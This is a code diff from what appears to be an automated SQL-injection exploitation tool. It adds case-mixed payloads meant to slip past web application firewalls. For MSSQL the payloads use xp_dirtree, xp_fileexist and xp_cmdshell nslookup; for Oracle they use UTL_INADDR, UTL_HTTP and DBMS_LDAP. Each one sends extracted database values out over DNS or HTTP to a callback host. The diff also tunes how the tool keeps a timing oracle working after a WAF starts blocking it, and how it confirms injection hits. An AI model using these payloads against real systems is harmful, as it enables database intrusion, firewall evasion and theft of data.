                 _ms_ft = f"{self._prefix}SELECT * FROM fn_trace_gettable({_unc_ms},1){self._suffix}"
+                # WAF keyword bypass: case-mixed stored procedure names (MSSQL proc lookup is case-insensitive)
+                _ms_dt_mx = f"{self._prefix}DECLARE @h VARCHAR(999);SET @h={_unc_ms};EXEC master..xP_DiRtReE @h{self._suffix}"
+                _ms_fe_mx = f"{self._prefix}DECLARE @h VARCHAR(999);SET @h={_unc_ms};EXEC master..xP_FiLeExIsT @h{self._suffix}"
+                _ms_xs_mx = f"{self._prefix}EXEC xP_cMdShElL {_q('nslookup ')}+{_hx_ms}+{_q('.' + _cb)}{self._suffix}"
                 _methods = [
-                    ("xp_dirtree",       _ms_dt, "xp_dirtree hex-encoded UNC DNS"),
-                    ("xp_fileexist",     _ms_fe, "xp_fileexist hex-encoded UNC DNS"),
-                    ("xp_cmdshell",      _ms_xs, "xp_cmdshell nslookup (stacked only)"),
-                    ("fn_trace_gettable", _ms_ft, "fn_trace_gettable UNC (inline capable)"),
+                    ("xp_dirtree",       _ms_dt,    "xp_dirtree hex-encoded UNC DNS"),
+                    ("xp_fileexist",     _ms_fe,    "xp_fileexist hex-encoded UNC DNS"),
+                    ("xp_cmdshell",      _ms_xs,    "xp_cmdshell nslookup (stacked only)"),
+                    ("fn_trace_gettable", _ms_ft,   "fn_trace_gettable UNC (inline capable)"),
+                    ("xp_dirtree_mx",    _ms_dt_mx, "xP_DiRtReE WAF case-bypass"),
+                    ("xp_fileexist_mx",  _ms_fe_mx, "xP_FiLeExIsT WAF case-bypass"),
+                    ("xp_cmdshell_mx",   _ms_xs_mx, "xP_cMdShElL WAF case-bypass"),
                 ]
             else:
                 # BUG-MSSQL-OOB-NONSTACK-DEDUP FIX: In non-stacked context, DECLARE/EXEC
@@ -146729,9 +147089,14 @@ class SideChannelExtractor:
                 # DNS).  Fixed: use only two distinct fn_trace_gettable inline forms.
                 _ms_dt = f"{self._prefix}AND 1=(SELECT COUNT(*) FROM fn_trace_gettable({_unc_ms},1)){self._suffix}"
                 _ms_fe = f"{self._prefix}AND EXISTS(SELECT * FROM fn_trace_gettable({_unc_ms},1)){self._suffix}"
+                # WAF keyword bypass: case-mixed fn_trace_gettable variants
+                _ms_dt_mx = f"{self._prefix}AND 1=(SELECT COUNT(*) FROM fN_tRaCe_gEtTaBlE({_unc_ms},1)){self._suffix}"
+                _ms_fe_mx = f"{self._prefix}AND EXISTS(SELECT * FROM fN_tRaCe_gEtTaBlE({_unc_ms},1)){self._suffix}"
                 _methods = [
-                    ("fn_trace_gettable_count",  _ms_dt, "fn_trace_gettable COUNT inline — UNC DNS trigger"),
-                    ("fn_trace_gettable_exists", _ms_fe, "fn_trace_gettable EXISTS inline — UNC DNS trigger"),
+                    ("fn_trace_gettable_count",    _ms_dt,    "fn_trace_gettable COUNT inline — UNC DNS trigger"),
+                    ("fn_trace_gettable_exists",   _ms_fe,    "fn_trace_gettable EXISTS inline — UNC DNS trigger"),
+                    ("fn_trace_gettable_mx_count",  _ms_dt_mx, "fN_tRaCe_gEtTaBlE COUNT WAF case-bypass"),
+                    ("fn_trace_gettable_mx_exists", _ms_fe_mx, "fN_tRaCe_gEtTaBlE EXISTS WAF case-bypass"),
                 ]
         elif self.dbms == "Oracle":
             # BUG-DNS-EXFIL-ORACLE-NONSTACK FIX: For non-stacked (B/E/T detections),
@@ -146751,10 +147116,22 @@ class SideChannelExtractor:
                 _ora_ui = f"{self._prefix}AND (SELECT UTL_INADDR.GET_HOST_ADDRESS({_ora_hx}) FROM DUAL) IS NOT NULL{self._suffix}"
                 _ora_uh = f"{self._prefix}AND (SELECT UTL_HTTP.REQUEST({_ora_http}) FROM DUAL) IS NOT NULL{self._suffix}"
                 _ora_ld = f"{self._prefix}AND (SELECT DBMS_LDAP.INIT(({expr})||{_q('.' + _cb)},80) FROM DUAL) IS NOT NULL{self._suffix}"
+            # WAF keyword bypass: case-mixed Oracle package names (Oracle resolves identifiers case-insensitively)
+            if self._stacked:
+                _ora_ui_mx = f"{self._prefix}SELECT UtL_InAdDr.GET_HOST_ADDRESS({_ora_hx}) FROM dual{self._suffix}"
+                _ora_uh_mx = f"{self._prefix}SELECT UtL_HtTp.REQUEST({_ora_http}) FROM dual{self._suffix}"
+                _ora_ld_mx = f"{self._prefix}SELECT DbMs_LdAp.INIT(({expr})||{_q('.' + _cb)},80) FROM dual{self._suffix}"
+            else:
+                _ora_ui_mx = f"{self._prefix}AND (SELECT UtL_InAdDr.GET_HOST_ADDRESS({_ora_hx}) FROM DUAL) IS NOT NULL{self._suffix}"
+                _ora_uh_mx = f"{self._prefix}AND (SELECT UtL_HtTp.REQUEST({_ora_http}) FROM DUAL) IS NOT NULL{self._suffix}"
+                _ora_ld_mx = f"{self._prefix}AND (SELECT DbMs_LdAp.INIT(({expr})||{_q('.' + _cb)},80) FROM DUAL) IS NOT NULL{self._suffix}"
             _methods = [
-                ("utl_inaddr", _ora_ui, "UTL_INADDR hex-encoded DNS (most reliable Oracle OOB)"),
-                ("utl_http",   _ora_uh, "UTL_HTTP request (needs ACL)"),
-                ("dbms_ldap",  _ora_ld, "DBMS_LDAP.INIT DNS lookup"),
+                ("utl_inaddr",    _ora_ui,    "UTL_INADDR hex-encoded DNS (most reliable Oracle OOB)"),
+                ("utl_http",      _ora_uh,    "UTL_HTTP request (needs ACL)"),
+                ("dbms_ldap",     _ora_ld,    "DBMS_LDAP.INIT DNS lookup"),
+                ("utl_inaddr_mx", _ora_ui_mx, "UtL_InAdDr WAF case-bypass"),
+                ("utl_http_mx",   _ora_uh_mx, "UtL_HtTp WAF case-bypass"),
+                ("dbms_ldap_mx",  _ora_ld_mx, "DbMs_LdAp WAF case-bypass"),
             ]
         elif self.dbms == "DB2":
             # BUG-DB2-NONSTACK FIX: SELECT XMLPARSE needs stacked or subquery wrapping
@@ -147041,6 +147418,33 @@ class SideChannelExtractor:
             return False
         if not self._stacked:
             return False
+        # BUG-LOCK-CONTENTION-REPROBE FIX (HIGH, PostgreSQL/CockroachDB/YugabyteDB/Redshift,
+        # stacked-query extraction, all surfaces): probe_lock_contention() always re-probes
+        # from scratch on every call. _sce.extract() is called once per target field
+        # (version, current_catalog, current_user), and each call invokes
+        # probe_lock_contention() independently — spending 6-8 pg_advisory_lock requests
+        # per field and never caching the viability result between calls.
+        #
+        # Production root cause: The initial probe (before Novel techniques) confirms
+        # lock contention at margin=10292ms. Novel techniques then send 50+ additional
+        # requests in complex SQL patterns. By the time _sce.extract() is called for the
+        # first field, the WAF/rate-limiter has learned the endpoint's SQL injection
+        # pattern and blocks pg_advisory_lock requests (fast 400 responses → margin≈32ms).
+        # The second and third field extractions also fail (margin≈8ms).
+        # Result: lock contention oracle "not viable" → all three fields return "" →
+        # side-channel extraction returns nothing despite a 10-second confirmed margin.
+        #
+        # Fix: if _lock_id is already set (previous probe confirmed viability), skip
+        # re-probing and return True immediately. The lock_id, threshold, and timing
+        # calibration from the first probe are still valid — no re-measurement needed.
+        # The unlock/acquire timing may differ slightly on subsequent calls, but the
+        # binary search uses a per-step ms measurement, not the cached threshold for
+        # the probe-phase contention. The calibrated _lock_threshold is what matters.
+        if getattr(self, '_lock_id', None) is not None:
+            LOG.debug("[SideChannel] lock-contention: already confirmed (lock_id=%s, "
+                      "threshold=%.0fms) — skipping re-probe",
+                      self._lock_id, getattr(self, '_lock_threshold', 500))
+            return True
         print("[SideChannel] Probing LOCK CONTENTION oracle...", flush=True)
 
         # (BUG-V39-BATCH-R FIX: removed redundant inline `import random` — module-level `random` already imported)
@@ -176776,10 +177180,14 @@ async def _run_fp_guards_boolean(
             param, original, tamper_chain, baseline,
             true_payload, false_payload, true_fp, false_fp,
             technique=technique)
+        # PCV-INDEPENDENCE FIX (Req 12): Log L1 vote but do NOT return early.
+        # The original sequential chain (L1 fail → early-exit, never running L2/L3)
+        # violated the independence requirement: a single L1 failure silenced L2 and
+        # L3 even though each guard sends its OWN fresh probes independently.
+        # Fix: record each guard's result, run all three, then apply majority vote (≥2/3).
         if not _fg_ok:
-            LOG.debug(f'[FP-Guards] FalsePositiveGuardV18 rejected {param!r} '
-                      f'(conf={_fg_conf:.3f}) — L1-L6 check failed')
-            return False, 0.0
+            LOG.debug(f'[FP-Guards] FalsePositiveGuardV18 VOTE=NO {param!r} '
+                      f'(conf={_fg_conf:.3f}) — L1-L6 check failed; running L2/L3 independently')
 
         # ── Layer 2: WelchConfirmer  paired t-test, N=4 pairs, p<0.05 ─────────
         # BUG-WELCH-N-PAIRS FIX (Req 3): n_pairs=4 gives only 4×2=8 total probes.
@@ -176816,19 +177224,31 @@ async def _run_fp_guards_boolean(
             param, original, tamper_chain,
             true_payload, false_payload, baseline, n_pairs=_welch_n_pairs,
             technique=technique)
+        # PCV-INDEPENDENCE FIX: Record L2 vote, do not return early.
         if not _wc_ok:
-            LOG.debug(f'[FP-Guards] WelchConfirmer rejected {param!r}: {_wc_reason}')
-            return False, 0.0
+            LOG.debug(f'[FP-Guards] WelchConfirmer VOTE=NO {param!r}: {_wc_reason}')
 
         # ── Layer 3: FalsePositiveValidator  mean/variance statistical check ─
         _fv = await FalsePositiveValidator.validate(
             engine, method, url, data, data_fmt,
             param, original, true_payload, false_payload,
             tamper_chain, n_trials=3, config=config, technique=technique)
+        # PCV-INDEPENDENCE FIX: Record L3 vote, do not return early.
         if not _fv.get('valid', False):
-            LOG.debug(f'[FP-Guards] FalsePositiveValidator rejected {param!r}: '
+            LOG.debug(f'[FP-Guards] FalsePositiveValidator VOTE=NO {param!r}: '
                       f'conf={_fv.get("confidence",0):.3f}')
+
+        # ── Majority vote: ≥2/3 guards must confirm independently ─────────────
+        # PCV-INDEPENDENCE FIX (Req 12): All three guards ran their own fresh probes.
+        # Combine their independent votes here. Require majority (≥2/3) to confirm,
+        # so no single guard failure causes unconditional rejection of a genuine hit.
+        _guard_votes = sum([bool(_fg_ok), bool(_wc_ok), bool(_fv.get('valid', False))])
+        if _guard_votes < 2:
+            LOG.debug(f'[FP-Guards] REJECTED {param!r}: {_guard_votes}/3 guards confirmed '
+                      f'(L1={_fg_ok}, L2={_wc_ok}, L3={_fv.get("valid",False)}) — need ≥2/3')
             return False, 0.0
+        LOG.debug(f'[FP-Guards] CONFIRMED {param!r}: {_guard_votes}/3 guards confirmed '
+                  f'(L1={_fg_ok}, L2={_wc_ok}, L3={_fv.get("valid",False)})')
 
         # ── PCV-FIX-4: Update BlindBoolCalibrator with observed similarities ──
         try:
